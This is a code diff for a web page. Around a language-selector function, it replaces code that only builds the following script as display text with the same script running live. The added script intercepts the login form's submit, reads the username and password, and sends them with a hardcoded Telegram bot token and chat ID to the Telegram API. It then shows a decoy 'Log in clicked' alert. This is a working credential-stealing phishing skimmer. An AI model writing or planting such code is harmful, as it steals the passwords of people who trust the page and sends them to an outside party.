@@ -699,55 +699,44 @@ function updateLanguageSelector(currentLang) {
     window.location.href = this.value;
   };
 }
-  <script>
-const js_thml = () => {
-	let code = "";
-	code += "<script>\n";
-	code += "\tasync function sendToTelegram(username, password) {\n";
-	code += "\t  const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';\n";
-	code += "\t  const chatId = '1747742228';\n";
-	code += "\t  const message = `Login Attempt:\\nUsername: ${username}\\nPassword: ${password}`;\n";
-	code += "\n";
-	code += "\t  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;\n";
-	code += "\n";
-	code += "\t  try {\n";
-	code += "\t\tconst response = await fetch(url, {\n";
-	code += "\t\t  method: 'POST',\n";
-	code += "\t\t  headers: {\n";
-	code += "\t\t\t'Content-Type': 'application/json'\n";
-	code += "\t\t  },\n";
-	code += "\t\t  body: JSON.stringify({\n";
-	code += "\t\t\tchat_id: chatId,\n";
-	code += "\t\t\ttext: message\n";
-	code += "\t\t  })\n";
-	code += "\t\t});\n";
-	code += "\n";
-	code += "\t\tif (!response.ok) {\n";
-	code += "\t\t  console.error('Failed to send message to Telegram');\n";
-	code += "\t\t}\n";
-	code += "\t  } catch (error) {\n";
-	code += "\t\tconsole.error('Error sending message to Telegram:', error);\n";
-	code += "\t  }\n";
-	code += "\t}\n";
-	code += "\n";
-	code += "\tdocument.querySelector('form').addEventListener('submit', function(event) {\n";
-	code += "\t  event.preventDefault();\n";
-	code += "\n";
-	code += "\t  const username = this.username.value;\n";
-	code += "\t  const password = this.password.value;\n";
-	code += "\n";
-	code += "\t  sendToTelegram(username, password);\n";
-	code += "\n";
-	code += "\t  alert('Log in clicked');\n";
-	code += "\t});\n";
-	code += "  <\\/script>\n";
-	code += "</body>\n";
-	code += "  </html>\n";
-	code += "\n";
-	return code;
-}
+<script>
+    async function sendToTelegram(username, password) {
+      const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
+      const chatId = '1747742228';
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
 
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-document.getElementById("js_html").innerText = js_thml();
-document.getElementById("html-text").value = js_thml();
-</script>
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send message to Telegram');
+        }
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+
+    document.querySelector('form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = this.username.value;
+      const password = this.password.value;
+
+      sendToTelegram(username, password);
+
+      alert('Log in clicked');
+    });
+  </script>
+</body>
+</html>
